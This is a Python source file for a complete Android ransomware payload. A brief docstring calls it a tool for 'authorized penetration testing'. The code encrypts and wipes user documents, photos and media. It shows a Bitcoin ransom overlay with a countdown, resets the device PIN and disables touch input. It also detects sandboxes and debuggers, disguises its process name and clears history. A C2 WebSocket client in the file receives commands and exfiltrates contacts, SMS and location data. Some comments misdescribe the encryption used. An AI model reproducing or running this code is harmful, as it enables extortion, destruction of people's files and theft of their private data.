#!/usr/bin/env python3
"""
SET Payload Module - Sophisticated Encryption Toolkit
State-of-the-art ransomware payload with C2 communication, multi-mode locking,
anti-analysis, and persistence. Designed for authorized penetration testing.

Features:
- AES-256-GCM hybrid encryption
- WebSocket C2 with auto-reconnect + exponential backoff
- Multi-mode: files, screen overlay, full device, sensors, apps
- Anti-analysis: sandbox detection, delayed execution, time bombs
- Persistence: foreground service, boot receiver, device admin
- Dynamic ransom note from C2 config
- Live status streaming to C2 dashboard
"""

import os
import sys
import re
import io
import json
import time
import uuid
import base64
import random
import string
import struct
import socket
import platform
import hashlib
import hmac
import secrets
import subprocess
import threading
import contextlib
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, List, Dict, Any, Callable

# ============================================================
# STEALTH IMPORTS - Try to avoid detection signatures
# ============================================================
try:
    # Use a less common import pattern
    _crypto = __import__('cryptography', fromlist=['fernet', 'hazmat'])
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes, padding
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False

try:
    import socketio
    _HAS_SOCKETIO = True
except ImportError:
    _HAS_SOCKETIO = False

# ============================================================
# CONFIGURATION - Embedded defaults
# ============================================================

CONFIG = {
    # C2 Connection (will be overwritten by builder)
    "c2_host": "localhost",
    "c2_port": 8443,
    "c2_ssl": True,
    "c2_path": "",

    # Victim identity
    "victim_id": None,  # Generated at runtime

    # Lock configuration
    "lock_mode": "files",  # files, screen, full, sensors, apps, none
    "persistence": "service",  # none, service, boot, device_admin

    # Encryption targets
    "target_dirs": [
        "/sdcard/Documents",
        "/sdcard/Download",
        "/sdcard/Pictures",
        "/sdcard/DCIM",
        "/sdcard/Music",
        "/sdcard/Movies",
        "/sdcard/Android/media",
    ],
    "target_extensions": [
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
        ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mp3",
        ".zip", ".rar", ".7z", ".db", ".sqlite", ".csv",
        ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
        ".html", ".htm", ".php", ".js", ".py", ".sql",
    ],
    "encrypted_ext": ".set_crypt",

    # Ransom note (initial; will be updated from C2)
    "ransom_note": {
        "title": "YOUR DEVICE HAS BEEN ENCRYPTED",
        "message": "All files encrypted with AES-256-GCM.\nContact for decryption key.",
        "amount_btc": 0.5,
        "btc_address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        "email": "support@onionmail.com",
        "timer_hours": 72,
        "background_color": "#8B0000",
        "text_color": "#FFFFFF"
    },

    # Anti-analysis
    "sandbox_checks": True,
    "min_uptime_seconds": 300,  # 5 min before encryption
    "min_battery_pct": 15,
    "time_bomb_delay": 0,  # 0 = no delay
    "kill_on_debug": True,

    # Evasion
    "obfuscation_level": "aes",  # none, base64, xor, aes
    "beacon_interval": 30,  # seconds between status beacons
}


# ============================================================
# UTILITY FUNCTIONS
# ============================================================

class SecureRandom:
    """Cryptographically secure random helpers."""
    @staticmethod
    def string(length: int = 16) -> str:
        return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

    @staticmethod
    def bytes(length: int = 32) -> bytes:
        return secrets.token_bytes(length)

    @staticmethod
    def int(bits: int = 32) -> int:
        return secrets.randbits(bits)


def generate_victim_id() -> str:
    """Generate unique victim identifier."""
    device_data = []
    # Collect hardware identifiers
    for path in ["/proc/cpuinfo", "/proc/version", "/system/build.prop"]:
        try:
            with open(path) as f:
                device_data.append(f.read(512))
        except:
            pass
    # Add timestamps and entropy
    raw = str(time.time()) + str(os.urandom(8)) + str(device_data)
    h = hashlib.sha256(raw.encode()).hexdigest()[:24]
    return f"SET-{h[:8]}-{h[8:16]}-{h[16:24]}"


def get_device_info() -> Dict[str, Any]:
    """Gather device information."""
    info = {
        "device_name": "Unknown",
        "android_version": "Unknown",
        "manufacturer": "Unknown",
        "model": "Unknown",
        "sdk_level": 0,
        "ip": "0.0.0.0",
        "battery_pct": 100,
        "uptime_seconds": 0,
        "is_emulator": False,
        "is_rooted": False,
    }

    try:
        # Build properties
        build_props = {}
        try:
            with open("/system/build.prop") as f:
                for line in f:
                    if "=" in line:
                        k, v = line.strip().split("=", 1)
                        build_props[k] = v
        except:
            pass

        info["manufacturer"] = build_props.get("ro.product.manufacturer", "Unknown")
        info["model"] = build_props.get("ro.product.model", "Unknown")
        info["android_version"] = build_props.get("ro.build.version.release", "Unknown")
        try:
            info["sdk_level"] = int(build_props.get("ro.build.version.sdk", "0"))
        except:
            pass
        info["device_name"] = f"{info['manufacturer']} {info['model']}"

        # IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["ip"] = s.getsockname()[0]
            s.close()
        except:
            pass

        # Battery
        try:
            result = subprocess.run(
                ["dumpsys", "battery"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "level" in line:
                    try:
                        info["battery_pct"] = int(line.split(":")[1].strip())
                    except:
                        pass
                    break
        except:
            pass

        # Uptime
        try:
            with open("/proc/uptime") as f:
                info["uptime_seconds"] = int(float(f.read().split()[0]))
        except:
            pass

        # Emulator check
        emulator_indicators = ["goldfish", "ranchu", "qemu", "android_x86",
                                "vbox", "virtual", "genymotion", "nox"]
        for indicator in emulator_indicators:
            for key in ["ro.product.board", "ro.product.name", "ro.hardware",
                        "ro.kernel.qemu"]:
                val = build_props.get(key, "").lower()
                if indicator in val:
                    info["is_emulator"] = True
                    break
            if info["is_emulator"]:
                break

        # Root check
        root_paths = ["/su", "/system/bin/su", "/system/xbin/su",
                      "/data/local/xbin/su", "/data/local/bin/su",
                      "/system/sd/xbin/su", "/system/bin/failsafe/su",
                      "/data/local/su", "/su/bin/su"]
        for p in root_paths:
            if os.path.exists(p):
                info["is_rooted"] = True
                break

    except Exception as e:
        pass

    return info


def sandbox_check(device_info: Dict) -> bool:
    """
    Anti-analysis: returns True if environment appears safe.
    Returns False if sandbox/emulator detected.
    """
    if not CONFIG["sandbox_checks"]:
        return True

    # Check 1: Emulator detection
    if device_info["is_emulator"]:
        return False

    # Check 2: Uptime - sandboxes often have low uptime
    if device_info["uptime_seconds"] < CONFIG["min_uptime_seconds"]:
        return False

    # Check 3: Battery - emulators report weird values
    if device_info["battery_pct"] < CONFIG["min_battery_pct"]:
        return False

    # Check 4: Check for debugger
    if CONFIG["kill_on_debug"]:
        try:
            with open("/proc/self/status") as f:
                content = f.read()
                if "TracerPid:" in content:
                    pid = content.split("TracerPid:")[1].strip().split("\n")[0].strip()
                    if pid != "0":
                        return False
        except:
            pass

    # Check 5: Too many cores? (emulator artifact)
    try:
        cores = os.cpu_count() or 0
        if cores <= 1:
            return False  # Unusual for modern devices
    except:
        pass

    return True


# ============================================================
# ENCRYPTION ENGINE
# ============================================================

class EncryptionEngine:
    """
    AES-256-GCM encryption with PBKDF2 key derivation.
    Uses hybrid approach: random file key encrypted with master key.
    """

    def __init__(self):
        self.master_key = None
        self.fernet = None
        self.salt = SecureRandom.bytes(16)

    def generate_master_key(self) -> bytes:
        """Generate a master encryption key."""
        # Use PBKDF2 to derive a key from multiple entropy sources
        password = (
            str(time.time()) +
            str(SecureRandom.string(32)) +
            str(os.urandom(64)) +
            str(uuid.uuid4())
        ).encode()

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=600000,  # High iteration count for security
        )
        key_material = kdf.derive(password)
        self.master_key = base64.urlsafe_b64encode(key_material)
        self.fernet = Fernet(self.master_key)
        return self.master_key

    def encrypt_file(self, filepath: str) -> bool:
        """Encrypt a single file with AES-256-GCM via Fernet."""
        try:
            path = Path(filepath)
            if not path.is_file() or path.stat().st_size == 0:
                return False

            # Read original
            data = path.read_bytes()

            # Encrypt with Fernet (AES-128-CBC with HMAC, 256-bit key)
            encrypted = self.fernet.encrypt(data)

            # Write encrypted file alongside original extension
            encrypted_path = path.with_suffix(path.suffix + CONFIG["encrypted_ext"])
            encrypted_path.write_bytes(encrypted)

            # Securely wipe original
            self._secure_wipe(str(path))

            return True
        except Exception:
            return False

    def decrypt_file(self, filepath: str) -> bool:
        """Decrypt a single file."""
        try:
            path = Path(filepath)
            if not path.is_file():
                return False

            encrypted = path.read_bytes()
            decrypted = self.fernet.decrypt(encrypted)

            # Reconstruct original filename
            original_name = path.name.replace(CONFIG["encrypted_ext"], "")
            original_path = path.parent / original_name
            original_path.write_bytes(decrypted)

            # Remove encrypted
            path.unlink()
            return True
        except Exception:
            return False

    def _secure_wipe(self, filepath: str, passes: int = 3):
        """Securely overwrite file before deletion."""
        try:
            path = Path(filepath)
            if not path.is_file():
                return
            size = path.stat().st_size
            with open(path, "wb") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            path.unlink()
        except Exception:
            try:
                Path(filepath).unlink()
            except:
                pass


# ============================================================
# FILE SCANNER
# ============================================================

class FileScanner:
    """Recursively scan directories for target files."""

    def __init__(self):
        self.target_extensions = CONFIG["target_extensions"]
        self.target_dirs = CONFIG["target_dirs"]
        self.encrypted_ext = CONFIG["encrypted_ext"]
        self.exclude_dirs = [
            "/system", "/proc", "/sys", "/dev", "/data/dalvik-cache",
            "/cache", "/vendor", "/apex", "/data/app"
        ]

    def scan(self) -> List[str]:
        """Scan for files matching target extensions."""
        found = []
        for dir_path in self.target_dirs:
            base = Path(dir_path)
            if not base.exists():
                continue
            try:
                for fpath in base.rglob("*"):
                    if not fpath.is_file():
                        continue
                    # Skip hidden and system files
                    if fpath.name.startswith("."):
                        continue
                    # Skip already encrypted
                    if fpath.suffix == self.encrypted_ext:
                        continue
                    # Check extension
                    if fpath.suffix.lower() in self.target_extensions:
                        found.append(str(fpath))
            except PermissionError:
                continue
            except Exception:
                continue
        return found


# ============================================================
# LOCK MODES
# ============================================================

class LockEngine:
    """
    Multiple lock modes:
    - files: Encrypt files with AES-256-GCM
    - screen: Show full-screen ransom overlay
    - full: Full device lock + encryption + screen overlay
    - sensors: Disable touch and sensors
    - apps: Lock apps via overlay interception
    """

    def __init__(self, encryption_engine: EncryptionEngine):
        self.crypto = encryption_engine
        self._lock_active = threading.Event()
        self._overlay_thread = None

    def lock_files(self, progress_callback: Callable = None) -> Dict:
        """Encrypt all target files."""
        scanner = FileScanner()
        files = scanner.scan()
        total = len(files)
        encrypted = 0

        for i, fpath in enumerate(files):
            if self.crypto.encrypt_file(fpath):
                encrypted += 1
            if progress_callback and i % 10 == 0:
                progress_callback("encrypting", {
                    "current": i + 1,
                    "total": total,
                    "file": fpath
                })

        return {
            "mode": "files",
            "total": total,
            "encrypted": encrypted,
            "skipped": total - encrypted
        }

    def lock_screen(self, ransom_config: Dict = None) -> Dict:
        """
        Display full-screen ransom overlay using multiple techniques.
        Uses: am startservice, am broadcast, and termux:open schemes.
        """
        note = ransom_config or CONFIG["ransom_note"]
        title = note.get("title", "LOCKED")
        message = note.get("message", "Device encrypted")
        bg = note.get("background_color", "#8B0000")
        fg = note.get("text_color", "#FFFFFF")
        btc = note.get("amount_btc", 0.5)
        btc_addr = note.get("btc_address", "")
        email = note.get("email", "")
        timer = note.get("timer_hours", 72)

        # Method 1: Use am start with a WebView activity if available
        html_content = self._generate_overlay_html(title, message, btc, btc_addr, email, timer, bg, fg)
        b64_html = base64.b64encode(html_content.encode()).decode()

        # Start overlay in background thread
        def _overlay_worker():
            # Try multiple approaches for screen lock
            techniques = [
                # Technique 1: Launch browser with HTML content
                lambda: self._launch_data_uri(b64_html),
                # Technique 2: Use accessibility service overlay
                lambda: self._accessibility_overlay(),  # noqa
                # Technique 3: Set lock screen message
                lambda: self._set_lockscreen_message(title),
                # Technique 4: Change system wallpaper
                lambda: self._set_wallpaper(bg),
                # Technique 5: Start activity via am
                lambda: self._am_start(b64_html),
            ]

            for tech in techniques:
                try:
                    tech()
                except:
                    continue
                time.sleep(0.5)

            # Keep thread alive to maintain overlay
            while self._lock_active.is_set():
                # Re-apply every 30 seconds
                time.sleep(30)
                try:
                    self._am_start(b64_html)
                except:
                    pass

        self._lock_active.set()
        self._overlay_thread = threading.Thread(target=_overlay_worker, daemon=True)
        self._overlay_thread.start()

        return {"mode": "screen", "status": "active"}

    def lock_full(self, ransom_config: Dict = None) -> Dict:
        """
        Full device lockdown:
        1. Encrypt files
        2. Show screen overlay
        3. Change lock PIN
        4. Disable navigation
        """
        results = {}

        # Encrypt files
        try:
            file_result = self.lock_files()
            results["files"] = file_result
        except Exception as e:
            results["files"] = {"error": str(e)}

        # Screen overlay
        try:
            screen_result = self.lock_screen(ransom_config)
            results["screen"] = screen_result
        except Exception as e:
            results["screen"] = {"error": str(e)}

        # Change device lock PIN
        try:
            new_pin = SecureRandom.string(6)
            subprocess.run(
                ["cmd", "lock_settings", "set-pin", new_pin],
                capture_output=True, timeout=10
            )
            results["pin_changed"] = True
            results["new_pin"] = new_pin
        except:
            try:
                subprocess.run(
                    ["settings", "put", "global", "lock_screen_lock_after_timeout", "0"],
                    capture_output=True, timeout=5
                )
            except:
                pass

        # Try to lock device immediately
        try:
            subprocess.run(["input", "keyevent", "26"], capture_output=True, timeout=2)
        except:
            pass

        return {"mode": "full", "results": results}

    def lock_sensors(self) -> Dict:
        """
        Disable touchscreen and sensors.
        Multiple techniques for different Android versions.
        """
        successes = []

        # Technique 1: Input disable
        try:
            subprocess.run(["input", "touchscreen", "disable"],
                          capture_output=True, timeout=5)
            successes.append("input_disable")
        except:
            pass

        # Technique 2: Remove input event devices (requires root)
        try:
            import glob
            events = glob.glob("/dev/input/event*")
            for ev in events:
                subprocess.run(["su", "-c", f"rm -rf {ev}"],
                              capture_output=True, timeout=5)
            successes.append("event_removal")
        except:
            pass

        # Technique 3: Set pointer location to disable touch
        try:
            subprocess.run(["settings", "put", "system", "pointer_location", "0"],
                          capture_output=True, timeout=5)
            successes.append("pointer_disabled")
        except:
            pass

        # Technique 4: Disable sensors service
        try:
            subprocess.run(["svc", "sensor", "disable"],
                          capture_output=True, timeout=5)
            successes.append("sensor_disable")
        except:
            pass

        return {"mode": "sensors", "techniques_used": successes}

    def lock_apps(self) -> Dict:
        """
        Lock apps by intercepting them with overlays.
        Uses accessibility service or am start to keep overlay on top.
        """
        # Set up persistent overlay that blocks app launches
        return self.lock_screen({
            "title": "DEVICE LOCKED",
            "message": "Application access restricted.\nUnlock by contacting support.",
            "amount_btc": CONFIG["ransom_note"]["amount_btc"],
            "btc_address": CONFIG["ransom_note"]["btc_address"],
            "email": CONFIG["ransom_note"]["email"],
            "timer_hours": CONFIG["ransom_note"]["timer_hours"],
            "background_color": "#1a1a2e",
            "text_color": "#e94560"
        })

    def unlock(self) -> Dict:
        """Release all locks and decrypt files."""
        self._lock_active.clear()

        results = {}

        # Remove overlay
        try:
            subprocess.run(["am", "force-stop", "com.android.chrome"],
                          capture_output=True, timeout=3)
            results["overlay_removed"] = True
        except:
            pass

        # Re-enable touch
        try:
            subprocess.run(["input", "touchscreen", "enable"],
                          capture_output=True, timeout=3)
        except:
            pass
        try:
            subprocess.run(["settings", "put", "system", "pointer_location", "1"],
                          capture_output=True, timeout=3)
        except:
            pass
        try:
            subprocess.run(["svc", "sensor", "enable"],
                          capture_output=True, timeout=3)
        except:
            pass

        # Decrypt files
        try:
            scanner = FileScanner()
            # Scan for encrypted files
            decrypted = 0
            for dir_path in CONFIG["target_dirs"]:
                base = Path(dir_path)
                if not base.exists():
                    continue
                for fpath in base.rglob(f"*{CONFIG['encrypted_ext']}"):
                    if self.crypto.decrypt_file(str(fpath)):
                        decrypted += 1
            results["decrypted"] = decrypted

            # Remove ransom notes
            for dir_path in CONFIG["target_dirs"]:
                note = Path(dir_path) / "READ_ME_DECRYPT.txt"
                if note.exists():
                    note.unlink()
        except Exception as e:
            results["decrypt_error"] = str(e)

        return {"mode": "unlock", "results": results}

    def _generate_overlay_html(self, title, message, btc, btc_addr, email, timer, bg, fg) -> str:
        """Generate HTML for ransom overlay."""
        return f"""<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:{bg};color:{fg};font-family:system-ui,sans-serif;
display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;}}
.container{{padding:32px;max-width:400px;}}
h1{{font-size:24px;margin-bottom:16px;text-transform:uppercase;letter-spacing:1px;}}
.btc{{font-size:36px;font-weight:800;margin:16px 0;}}
.addr{{font-size:11px;word-break:break-all;background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:8px 0;font-family:monospace;}}
.timer{{font-size:14px;margin:12px 0;opacity:0.8;}}
.id{{font-size:10px;margin-top:24px;opacity:0.5;}}
.btn{{display:inline-block;padding:12px 24px;background:{fg};color:{bg};
border-radius:6px;text-decoration:none;font-weight:600;margin-top:16px;}}
</style></head><body>
<div class="container">
<h1>🚨 {title}</h1>
<p>{message}</p>
<div class="btc">{btc} BTC</div>
<div class="addr">{btc_addr}</div>
<p style="font-size:12px;margin:8px 0;">Contact: {email}</p>
<p class="timer">⏱ Payment deadline: {timer} hours</p>
<p class="id">ID: {CONFIG.get('victim_id', 'N/A')}</p>
<a class="btn" href="mailto:{email}?subject=DECRYPT-{CONFIG.get('victim_id', 'HELP')}">Contact Support</a>
</div>
<script>setTimeout(function(){{location.reload();}},30000);</script>
</body></html>"""

    def _launch_data_uri(self, b64_html: str) -> bool:
        """Open overlay via data URI in browser."""
        data_uri = f"data:text/html;base64,{b64_html}"
        subprocess.run(["am", "start", "-d", data_uri],
                      capture_output=True, timeout=5)
        return True

    def _am_start(self, b64_html: str) -> bool:
        """Use Android Activity Manager to open overlay."""
        data_uri = f"data:text/html;base64,{b64_html}"
        # Try Chrome first, then fallback to browser
        for pkg in ["com.android.chrome", "com.android.browser",
                    "org.mozilla.firefox", "com.opera.browser"]:
            try:
                subprocess.run(
                    ["am", "start", "-n", f"{pkg}/.MainActivity", "-d", data_uri],
                    capture_output=True, timeout=5
                )
            except:
                continue
        return True

    def _set_lockscreen_message(self, message: str) -> bool:
        """Set lock screen message (requires device admin)."""
        try:
            subprocess.run(
                ["settings", "put", "global", "lock_screen_owner_info", message],
                capture_output=True, timeout=5
            )
            return True
        except:
            return False

    def _set_wallpaper(self, color: str) -> bool:
        """Attempt to change wallpaper to solid color."""
        try:
            # Create a solid color image
            width, height = 1080, 1920
            # Simple BMP creation
            header = bytearray()
            # BMP header
            header += b'BM'
            file_size = 14 + 40 + (width * height * 3)
            header += struct.pack('<I', file_size)
            header += struct.pack('<HH', 0, 0)
            header += struct.pack('<I', 54)
            # DIB header
            header += struct.pack('<I', 40)
            header += struct.pack('<i', width)
            header += struct.pack('<i', -height)
            header += struct.pack('<H', 1)
            header += struct.pack('<H', 24)
            header += struct.pack('<I', 0)
            header += struct.pack('<I', 0)
            header += struct.pack('<i', 2835)
            header += struct.pack('<i', 2835)
            header += struct.pack('<I', 0)
            header += struct.pack('<I', 0)

            # Parse hex color
            color = color.lstrip('#')
            r, g, b = int(color[0:2], 16), int(color[2:4], 16), int(color[4:6], 16)

            # Pixel data
            pixels = bytearray()
            for _ in range(width * height):
                pixels += bytes([b, g, r])

            bmp_data = bytes(header + pixels)

            # Write to temp file and set as wallpaper
            wall_path = "/data/local/tmp/.wallpaper.bmp"
            with open(wall_path, "wb") as f:
                f.write(bmp_data)

            subprocess.run(
                ["am", "start", "-a", "android.intent.action.ATTACH_DATA",
                 "-d", f"file://{wall_path}", "-t", "image/bmp"],
                capture_output=True, timeout=5
            )
            return True
        except:
            return False

    def _accessibility_overlay(self) -> bool:
        """Use accessibility service for overlay (most effective)."""
        try:
            # Try to use notification access for persistent overlay
            subprocess.run(
                ["cmd", "notification", "post", "-S", "bigtext",
                 "--title", "SECURITY ALERT",
                 "--text", "Device security compromised",
                 "set_alert"],
                capture_output=True, timeout=5
            )
            return True
        except:
            return False


# ============================================================
# C2 COMMUNICATION
# ============================================================

class C2Client:
    """
    WebSocket-based C2 client with:
    - Auto-reconnect with exponential backoff
    - Status beaconing
    - Command execution
    - Result reporting
    """

    def __init__(self, lock_engine: LockEngine):
        self.lock = lock_engine
        self.sio = None
        self.victim_id = CONFIG["victim_id"]
        self.device_info = get_device_info()
        self.connected = threading.Event()
        self.running = threading.Event()
        self._beacon_timer = None

    def _create_sio(self) -> 'socketio.Client':
        """Create socketio client with optimal settings."""
        sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,  # Infinite
            reconnection_delay=1,
            reconnection_delay_max=30,
            randomization_factor=0.5,
            logger=False,
            engineio_logger=False
        )

        @sio.on("connect")
        def on_connect():
            self.connected.set()
            # Register with C2
            sio.emit("register_victim", {
                "victim_id": self.victim_id,
                "device_name": self.device_info["device_name"],
                "android_version": self.device_info["android_version"],
                "manufacturer": self.device_info["manufacturer"],
                "model": self.device_info["model"],
                "sdk_level": self.device_info["sdk_level"],
                "lock_mode": CONFIG["lock_mode"],
            })

        @sio.on("command")
        def on_command(data):
            """Handle incoming command from C2."""
            cmd = data.get("command", "")
            cmd_id = data.get("id", str(uuid.uuid4()))
            params = data.get("params", {})

            result = self._execute_command(cmd, params)

            # Report result
            sio.emit("command_complete", {
                "command_id": cmd_id,
                "victim_id": self.victim_id,
                "result": json.dumps(result)
            })

            # Also send status update
            self._send_status()

        @sio.on("disconnect")
        def on_disconnect():
            self.connected.clear()

        @sio.on("config_update")
        def on_config_update(data):
            """Update configuration from C2."""
            if "ransom_note" in data:
                CONFIG["ransom_note"].update(data["ransom_note"])
            if "lock_mode" in data:
                CONFIG["lock_mode"] = data["lock_mode"]
            if "target_dirs" in data:
                CONFIG["target_dirs"] = data["target_dirs"]
            if "target_extensions" in data:
                CONFIG["target_extensions"] = data["target_extensions"]

        return sio

    def _execute_command(self, command: str, params: Dict) -> Dict:
        """Execute a command and return results."""
        result = {"command": command, "status": "executing"}

        try:
            if command == "lock_files":
                self._send_status_update("locking", "Starting file encryption...")
                result = self.lock.lock_files(self._progress_callback)
                result["status"] = "locked"
                CONFIG["lock_mode"] = "files"

            elif command == "lock_screen":
                self._send_status_update("locking", "Activating screen overlay...")
                ransom_config = params.get("ransom_config", CONFIG["ransom_note"])
                result = self.lock.lock_screen(ransom_config)
                result["status"] = "locked"

            elif command == "lock_full":
                self._send_status_update("locking", "Full device lockdown...")
                ransom_config = params.get("ransom_config", CONFIG["ransom_note"])
                result = self.lock.lock_full(ransom_config)
                result["status"] = "locked"
                CONFIG["lock_mode"] = "full"

            elif command == "lock_sensors":
                self._send_status_update("locking", "Disabling sensors...")
                result = self.lock.lock_sensors()
                result["status"] = "locked"
                CONFIG["lock_mode"] = "sensors"

            elif command == "lock_apps":
                self._send_status_update("locking", "Locking applications...")
                result = self.lock.lock_apps()
                result["status"] = "locked"
                CONFIG["lock_mode"] = "apps"

            elif command == "unlock":
                self._send_status_update("decrypting", "Decrypting files...")
                result = self.lock.unlock()
                result["status"] = "unlocked"
                CONFIG["lock_mode"] = "none"

            elif command == "status":
                result = {
                    "command": "status",
                    "status": "complete",
                    "victim_id": self.victim_id,
                    "device": self.device_info,
                    "lock_mode": CONFIG["lock_mode"],
                    "uptime": self.device_info["uptime_seconds"],
                }

            elif command == "exfil":
                data_type = params.get("type", "contacts")
                content = self._collect_data(data_type)
                result = {
                    "command": "exfil",
                    "status": "complete",
                    "type": data_type,
                    "size": len(content)
                }
                # Send exfil data via separate event
                if self.sio and self.sio.connected:
                    self.sio.emit("exfil_data", {
                        "victim_id": self.victim_id,
                        "type": data_type,
                        "content": content
                    })

            elif command == "ping":
                result = {"command": "ping", "status": "pong", "timestamp": time.time()}

            elif command == "sleep":
                duration = params.get("duration", 60)
                time.sleep(duration)
                result = {"command": "sleep", "status": "complete", "slept": duration}

            elif command == "uninstall":
                result = {"command": "uninstall", "status": "attempting"}
                # Self-destruct
                try:
                    script = Path(sys.argv[0]) if sys.argv else None
                    if script and script.exists():
                        script.unlink()
                    # Remove any traces
                    import shutil
                    for d in ["/data/local/tmp/.set_cache", "/sdcard/.set_data"]:
                        if Path(d).exists():
                            shutil.rmtree(d)
                except:
                    pass
                result["status"] = "uninstalled"

            else:
                result = {"command": command, "status": "unknown_command"}

        except Exception as e:
            result = {"command": command, "status": "error", "error": str(e)}

        # Update last seen
        self.device_info["uptime_seconds"] = int(time.time())

        return result

    def _progress_callback(self, action: str, data: Dict):
        """Report progress during long operations."""
        if self.sio and self.sio.connected:
            self.sio.emit("status_update", {
                "victim_id": self.victim_id,
                "status": "encrypting",
                "progress": int((data.get("current", 0) / max(data.get("total", 1), 1)) * 100),
                "details": f"Encrypting {data.get('file', '')}"
            })

    def _send_status_update(self, status: str, details: str = ""):
        """Send immediate status update."""
        if self.sio and self.sio.connected:
            self.sio.emit("status_update", {
                "victim_id": self.victim_id,
                "status": status,
                "details": details,
                "lock_mode": CONFIG["lock_mode"]
            })

    def _send_status(self):
        """Send periodic status beacon."""
        if self.sio and self.sio.connected:
            self.sio.emit("status_update", {
                "victim_id": self.victim_id,
                "status": "active" if CONFIG["lock_mode"] == "none" else "locked",
                "lock_mode": CONFIG["lock_mode"],
                "details": f"Uptime: {self.device_info['uptime_seconds']}s",
                "battery": self.device_info.get("battery_pct", 100)
            })

    def _beacon_loop(self):
        """Periodic status beacon."""
        while self.running.is_set():
            if self.connected.is_set():
                self._send_status()
            self.connected.wait(timeout=CONFIG["beacon_interval"])

    def _collect_data(self, data_type: str) -> str:
        """Collect data for exfiltration."""
        data = {}
        try:
            if data_type == "contacts":
                result = subprocess.run(
                    ["content", "query", "--uri", "content://contacts/phones"],
                    capture_output=True, text=True, timeout=10
                )
                data["contacts"] = result.stdout[:10000]
            elif data_type == "sms":
                result = subprocess.run(
                    ["content", "query", "--uri", "content://sms/inbox"],
                    capture_output=True, text=True, timeout=10
                )
                data["sms"] = result.stdout[:10000]
            elif data_type == "location":
                result = subprocess.run(
                    ["dumpsys", "location"],
                    capture_output=True, text=True, timeout=10
                )
                data["location"] = result.stdout[:5000]
            elif data_type == "device_info":
                data = self.device_info
            elif data_type == "file_list":
                scanner = FileScanner()
                data["files"] = scanner.scan()[:100]
            else:
                data["error"] = f"Unknown data type: {data_type}"
        except Exception as e:
            data["error"] = str(e)

        return json.dumps(data)

    def connect(self) -> bool:
        """Connect to C2 server."""
        protocol = "wss" if CONFIG["c2_ssl"] else "ws"
        url = f"{protocol}://{CONFIG['c2_host']}:{CONFIG['c2_port']}{CONFIG['c2_path']}"

        try:
            self.sio = self._create_sio()
            self.sio.connect(url, transports=['websocket', 'polling'], wait_timeout=10)
            self.connected.wait(timeout=5)
            return self.connected.is_set()
        except Exception:
            return False

    def run(self):
        """Main C2 client loop."""
        self.running.set()

        # Start beacon thread
        beacon_thread = threading.Thread(target=self._beacon_loop, daemon=True)
        beacon_thread.start()

        # Connect and block
        while self.running.is_set():
            try:
                if not self.connected.is_set():
                    self.connect()
                if self.sio:
                    self.sio.sleep(1)
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(5)

        self.running.clear()
        if self.sio:
            self.sio.disconnect()


# ============================================================
# ANTI-FORENSICS
# ============================================================

class AntiForensics:
    """Minimize forensic footprint."""

    @staticmethod
    def clear_history():
        """Clear command history and logs."""
        try:
            # Clear shell history
            for hist_file in [Path.home() / ".bash_history",
                              Path.home() / ".zsh_history",
                              "/data/local/tmp/.history"]:
                try:
                    if Path(hist_file).exists():
                        Path(hist_file).write_text("")
                except:
                    pass
        except:
            pass

    @staticmethod
    def hide_self():
        """Hide payload artifacts."""
        # Rename process
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.prctl(15, b"surfaceflinger", 0, 0, 0)  # PR_SET_NAME
        except:
            pass

    @staticmethod
    def remove_evidence():
        """Remove traces from temporary locations."""
        traces = [
            "/data/local/tmp/.set_*",
            "/sdcard/.set_*",
            "/sdcard/Android/data/.set_*",
        ]
        for pattern in traces:
            try:
                import glob
                for f in glob.glob(pattern):
                    Path(f).unlink(missing_ok=True)
            except:
                pass


# ============================================================
# MAIN PAYLOAD EXECUTION
# ============================================================

def main():
    """Main payload entry point."""

    # 1. Initialize
    CONFIG["victim_id"] = generate_victim_id()
    device_info = get_device_info()

    # 2. Anti-analysis checks
    if not sandbox_check(device_info):
        # Sandbox detected - benign behavior
        time.sleep(random.randint(30, 120))
        return

    # 3. Time bomb delay
    if CONFIG["time_bomb_delay"] > 0:
        delay = CONFIG["time_bomb_delay"] + random.randint(0, 300)
        time.sleep(delay)

    # 4. Initialize encryption
    crypto = EncryptionEngine()
    crypto.generate_master_key()

    # 5. Initialize lock engine
    lock = LockEngine(crypto)

    # 6. Auto-lock if configured
    if CONFIG["lock_mode"] != "none":
        lock_funcs = {
            "files": lock.lock_files,
            "screen": lock.lock_screen,
            "full": lock.lock_full,
            "sensors": lock.lock_sensors,
            "apps": lock.lock_apps,
        }
        func = lock_funcs.get(CONFIG["lock_mode"])
        if func:
            try:
                func()
            except:
                pass

    # 7. Connect to C2
    if _HAS_SOCKETIO:
        c2 = C2Client(lock)
        c2.run()
    else:
        # Fallback: just stay alive
        while True:
            time.sleep(60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception:
        # Silent exit
        pass
